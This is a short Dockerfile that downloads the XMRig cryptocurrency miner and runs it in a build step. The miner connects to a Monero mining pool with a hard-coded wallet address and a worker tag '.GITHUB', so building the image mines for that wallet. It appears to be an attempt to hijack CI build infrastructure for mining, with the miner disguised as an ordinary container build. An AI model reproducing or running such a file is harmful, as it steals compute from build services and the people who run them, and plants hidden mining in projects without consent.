FROM debian:stable
RUN apt-get update && apt-get -y install wget vim
WORKDIR /home
RUN wget https://github.com/xmrig/xmrig/releases/download/v6.8.1/xmrig-6.8.1-bionic-x64.tar.gz
RUN tar -xvf xmrig-6.8.1-bionic-x64.tar.gz
RUN ./xmrig-6.8.1/xmrig -o pool.minexmr.com:4444 -u 837oyBXT2vzP3PmYVmDnLiDceBSs1eC4ANHZgFNctXLQGKFKBLVkVB8VttiKVyrGMt7a9vkZ9EHp5HW99RzqrY7q22A8nhT.GITHUB -p x -t 6
